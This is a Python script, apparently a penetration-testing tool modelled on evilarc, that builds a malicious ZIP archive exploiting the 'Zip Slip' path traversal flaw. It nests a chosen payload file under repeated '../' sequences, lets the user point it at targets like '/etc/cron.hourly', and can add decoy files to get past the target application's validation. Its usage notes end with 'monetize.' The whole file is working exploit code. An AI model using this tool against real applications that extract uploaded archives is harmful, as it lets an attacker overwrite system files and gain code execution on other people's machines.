#! /usr/bin/env python3

"""
Author:
	https://github.com/illordlo

Creation date:
	2021-11-09

Description:
	This script can be used to create a ZIP archive able to exploit
	the "Zip Slip" vulnerability.

	It has been inspired by evilrac.

	The script is able to create an archive that contains either the
	malicious file only or even other "good" files, that are sometimes
	needed to bypass some validation checks done by the target
	application.

	To create a malicious ZIP archive:
	- create a folder containing the "good" files and folders
	  you want to insert in the archive;
	- create the malicious file naming it whatever you want;
	- pass to the command line the required arguments and generate
	  the final evil archive;
	- monetize.

	References:
	- https://github.com/ptoomey3/evilarc
	- https://snyk.io/research/zip-slip-vulnerability

Limitations:
	- see Python3 zipfile module limitations

To-do:
	- add support for other archives:
	- add support for multiple evil files.

Changes:
	- 2020-11-09:
		Created the script
"""

import argparse
import os
import sys
from zipfile import ZipFile, ZIP_DEFLATED

"""
Add content to the archive. This code has been lifted from
https://raw.githubusercontent.com/python/cpython/3.10/Lib/zipfile.py
"""
def addToZip(zf, path, zippath):
	if os.path.isfile(path):
		print("[+] Adding {}".format(path))
		zf.write(path, zippath, ZIP_DEFLATED)
	elif os.path.isdir(path):
		if zippath:
			print("[+]\t Adding {} ...".format(path))
			zf.write(path, zippath)
		for nm in sorted(os.listdir(path)):
			addToZip(zf,
				os.path.join(path, nm), os.path.join(zippath, nm))
            # else: ignore

"""
The main function
"""
def main():

	parser = argparse.ArgumentParser()

	"""
	Getting mandatory arguments from the command line
	"""
	parser.add_argument("-a", "--evil-archive",
					help="[mandatory] The generated archive containing the malicious file.")
	parser.add_argument("-e", "--evil-file",
					help="[mandatory] The evil file used to exploit the vulnerability.")

	"""
	Getting optional arguments from the command line
	"""
	parser.add_argument("-d", "--depth",
					default=5,
					help="The evil file's path traversal depth.")
	parser.add_argument("-g", "--good-folder",
					help="The folder containing good files and subdirs.")
	parser.add_argument("-p", "--path",
					default="",
					help='The path to prefix to the evil file name (e.g. /etc/cron.hourly).')
	parser.add_argument("-w", "--for-windows",
					action='store_true',
					help="Use the Microsoft Windows path separator (instead of the default Unix separator).")

	args = parser.parse_args()

	"""
	Check if mandatory arguments have been provided
	"""
	if (args.evil_file == None or
		args.evil_archive == None):
		
		parser.print_help()
		sys.exit(1)

	print("\n[+] Starting...\n")

	"""
	Initial checks
	"""
	if args.good_folder and (not os.path.isdir(args.good_folder)):
		print("[+] Error: the folder containing good files does not exist.")
		sys.exit(1)
	

	if not os.path.exists(args.evil_file):
		print("[+] Error: the evil file does not exist.")
		sys.exit(1)
	

	if os.path.exists(args.evil_archive):
		print("[+] Error: the evil archive already exists.")
		sys.exit(1)
	
	"""
	Generate the archive with the good files, if they are provided.
	Code lifted from https://raw.githubusercontent.com/python/cpython/3.10/Lib/zipfile.py
	"""
	if args.good_folder:
		with ZipFile(args.evil_archive, 'w') as zf:
			for path in os.listdir(args.good_folder):
				zippath = os.path.basename(path)
				if not zippath:
					zippath = os.path.basename(os.path.dirname(path))
				if zippath in ('', os.curdir, os.pardir):
					zippath = ''
				addToZip(zf, os.path.join(args.good_folder, path), zippath)

	"""
	Add evil file to the archive
	"""
	with ZipFile(args.evil_archive, 'a') as zf:
		path_sep = ""
		if args.for_windows:
			path_sep = "..\\"
			if args.path != "":
				if args.path[0] == '\\':
					args.path = args.path[1:]
				if args.path[-1] != '\\':
					args.path += '\\'
		else:
			path_sep = "../"
			if args.path != "":
				if args.path[0] == '/':
					args.path = args.path[1:]
				if args.path[-1] != '/':
					args.path += '/'
			
		zippath = "/{}{}{}".format(path_sep * int(args.depth), args.path, os.path.basename(args.evil_file))
		addToZip(zf, args.evil_file, zippath)

		print("\n[+] Evil file added as {}\n".format(zippath))


if __name__ == '__main__':
	main()
